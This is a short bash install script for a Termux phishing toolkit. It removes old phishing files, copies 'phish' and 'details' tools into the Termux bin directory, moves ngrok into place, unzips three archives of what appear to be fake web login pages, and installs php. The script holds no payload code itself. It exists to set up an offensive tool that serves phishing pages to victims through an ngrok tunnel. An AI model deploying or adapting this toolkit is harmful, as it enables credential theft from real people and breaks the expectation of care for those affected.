#! /bin/bash
cd 
rm -rf ngrok
cd /data/data/com.termux/files/usr/bin
rm -rf phish
rm -rf details
echo "removing all old phishing files"
cd 
cd Phishing
cp -r details /data/data/com.termux/files/usr/bin
cp -r phish /data/data/com.termux/files/usr/bin
cd /data/data/com.termux/files/usr/bin
chmod 775 phish
chmod 775 details
cd
cd Phishing
mv ngrok $HOME
cd
chmod +x *
echo "installing files"
unzip WebPages1.zip
unzip WebPages2.zip
unzip WebPages3.zip
rm -rf WebPages1.zip

rm -rf WebPages2.zip
rm -rf WebPages3.zip
cd
chmod +x *
pkg install gem -y
gem install lolcat
pkg install php



echo "run tool by writing - phish"
